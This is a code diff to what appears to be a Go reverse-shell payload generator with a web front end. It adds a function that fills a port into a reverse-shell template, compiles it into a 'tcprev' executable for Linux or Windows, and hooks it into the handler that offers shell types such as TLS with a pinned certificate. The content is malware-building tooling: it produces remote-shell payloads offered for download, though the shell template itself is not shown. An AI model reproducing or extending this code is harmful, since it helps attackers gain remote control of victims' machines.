@@ -349,6 +349,65 @@ func creategopayload(ipandport, basefilepath, outfilepath, downloadlink, sourcef
 	}
 }
 
+func createrevgoshell(revshellfilepath, outfilepath, port string) {
+	file, err := os.Open(revshellfilepath)
+	if err != nil {
+		log.Fatal(err)
+	}
+	defer file.Close()
+
+	newFile, err := os.Create(outfilepath)
+	if err != nil {
+		log.Fatal(err)
+	}
+	defer newFile.Close()
+
+	scanner := bufio.NewScanner(file)
+	for scanner.Scan() {
+		str := scanner.Text()
+		if strings.Contains(str, "REVPRT") {
+			str = strings.Replace(str, "REVPRT", port, 1)
+		}
+		newFile.WriteString(str + "\n")
+	}
+
+	if err := scanner.Err(); err != nil {
+		log.Fatal(err)
+	}
+	//buildexe("download/"+"tcprev"+".exe", "outfiles/rev.go")
+
+	if runtime.GOOS == "linux" {
+		cmdpath, _ := exec.LookPath("bash")
+		var execargs string
+		execargs = "go build -o download/tcprev " + outfilepath
+
+		//fmt.Println(execargs)
+		cmd := exec.Command(cmdpath, "-c", execargs)
+		err := cmd.Start()
+		//cmd.Wait()
+		if err != nil {
+			fmt.Println(err)
+		} else {
+			fmt.Println(exepath)
+			//fmt.Println(gofilepath)
+			fmt.Println("Server is ready !")
+		}
+	} else {
+		//fmt.Println("About to build " + gofilepath)
+		cmd := exec.Command("go", "build", "-o", "download/tcprev.exe", outfilepath)
+		err := cmd.Start()
+		//cmd.Wait()
+		if err != nil {
+			fmt.Println(err)
+		} else {
+			fmt.Println(exepath)
+			//fmt.Println(gofilepath)
+			fmt.Println("Server is ready !")
+		}
+	}
+
+}
+
 func creategorevhttppayload(ipandport string) {
 	file, err := os.Open("basefiles/gorevhttp.go")
 	if err != nil {
@@ -491,6 +550,7 @@ func index(httpw http.ResponseWriter, req *http.Request) {
 				basepath = filepath.FromSlash("basefiles/gorevcmd.go")
 				outpath = filepath.FromSlash("outfiles/gorevcmd.go")
 				exeoutpath = filepath.FromSlash("outfiles/gorevcmd.go")
+				createrevgoshell("manager/tcprev.go", "outfiles/tcprev.go", rport)
 			} else if shelltype == "TCP/TLS(PinnedCert)" {
 				basepath = filepath.FromSlash("basefiles/mask.go")
 				outpath = filepath.FromSlash("outfiles/mask.go")
@@ -501,6 +561,7 @@ func index(httpw http.ResponseWriter, req *http.Request) {
 				exeoutpath = filepath.FromSlash("outfiles/shadow.go")
 			}
 			creategopayload(rhost+":"+rport, basepath, outpath, exepath, exeoutpath, ostype, archtype, fprint)
+
 			//time.Sleep(5000 * time.Millisecond)
 			dwnloadlink.Link = downloadlink
 			gofiles, err := filepath.Glob("outfiles/*.go")
